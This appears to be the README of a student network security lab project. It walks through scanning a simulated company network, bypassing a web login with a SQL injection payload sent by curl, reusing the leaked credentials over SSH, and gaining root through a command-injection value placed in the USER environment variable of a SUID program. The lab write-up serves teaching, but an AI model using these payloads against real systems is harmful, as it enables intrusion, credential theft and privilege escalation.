# NetworkSecurity-Project

Network Security project about SSH, Database and SQL Injection.

# Network Scheme

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/network_scheme.svg" width=500>

-   Sql Network
    1. Web Server hosting a stub site using NodeJS
    2. MySQL Server hosting sensitive information
-   Employee Network
    1. BobPC which represent the hacker host
    2. TomPC which represent the target host
-   Company Network
    1. All the Employee network
    2. Web Server

# Background Scenario

This lab is about a industrial espionage, represented by Bob, who is infiltrated inside a company lan network and found, among a lot of other devices, one vulnerable computer that belongs to Tom and an useful site open ONLY inside the company network.

During the demostration scenario we found out these IP from 2 different subnets:

-   _193.20.3.1_ - Company Network
-   _193.20.3.2_ - Bob PC on company network

-   _193.20.1.1_ - Employee Network
-   _193.20.1.2_ - Bob PC on employee network
-   _193.20.1.3_ - Tom PC on employee network

And we don't have any access to the Web network.

# Instruction: what to do

1. Footprinting: gather information online about the organization
2. Scanning: scan vulnerable point of access
3. Enumeration: probing more intrusive of vulnerable services
4. Exploitation: attacking those potential vulnerability

## Footprinting

In this case scenario we're already connected to the local network, so we've already gathered enought information about our target

## Scanning

We start find out our IP address on the networks using `ifconfig` command, and we found out.

Using then `nmap` tool with these options:

-   “-sn” means “no port scan”
-   “-PE” sends ICMP Echo Request
-   “--send-ip” to not send ARP packets

We found out some host IP:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/scanning_company_network.PNG" width=500>

**_Company Network_**

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/scanning_employee_network.PNG" width=500>

**_Employee Network_**

## Enumeration

We're interested in the Web Server and in Tom PC, so we can scan more aggressively to find about any open port

If we use simply a TPC SYN scan from nmap, we find vague information:

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/enumeration_company_ss.PNG" width=500>

Else, if we explore more with a Version Detection scan, we can scan even beyond the typical use of a port like 8080:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/enumeration_company_sv.PNG" width=500>

and we find about a web server open on port 8080.

Meanwhile on Tom PC we found an open SSH port

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/enumeration_tom_sv.PNG" width=500>

We can think about SSH after getting information about the site.
Now we can find about this site (in a real case scenario we should use DirBuster to map the entire site) and the main page.

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/webserver_curl.PNG" width=500>

We retrived the html page using `curl` and found out about a login form, which we can try to exploit.

## Exploitation

We can try some usual combination for the form

```bash
curl -X POST -d 'username=a&password=b' 193.20.3.1:8080
```

Which returns "Error value(s) missing"

```bash
curl -X POST -d 'username=&password=b' 193.20.3.1:8080
```

Which returns

`{"success":false,"response":"No user found","result":[]}`

and we can try last one with MySQL injection using OR and commenting syntax

```bash
curl -X POST -d 'username=" OR 1<2; -- &password=b' 193.20.3.1:8080
```

which return us a bunch of credentials

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/webserver_sql.png" width=500>

including only one user called Tom with:

```
username = tcasaccio1
password = YLN1NrMdGN
```

## SSH Access

Now that we gather those information, we can hope that the only user we know has the same user and password as this database.

We can try to log in using:

```bash
ssh tcasaccio1@193.20.1.3
```

# Privilege Escalation Procedure

From the ssh entrypoint on TomPC, we can trace our privileges on the machine and which files we can access:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_whoami.PNG" width=400>

As we can see, user tcasaccio1 doesn't belong to sudo group, let's see if we can access to /etc/passwd and then to /etc/shadow to retrieve hashed passwords:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_passwd.PNG" width=500>

We have to find another way to gain elevated privileges, let's find files with the SUID bit set:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_suid.PNG" width=400>
<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_suid2.PNG" width=500>

The Set User IDentity bit allow users to run executables with the file system permissions of the executable's owner to perform a specific task, in this case with root privileges.

In /home/tcasaccio1 there is a file with the SUID bit set, let's see if we can exploit this program:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_program.PNG" width=500>

In this case, we can modify the USER environment variable by creating an environment variable injection.

```bash
export USER="; /bin/bash; echo ":tcasaccio1
```

Obtaining this behaviour by the program:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_exploit.PNG" width=500>

So now we have root permissions on the machine.
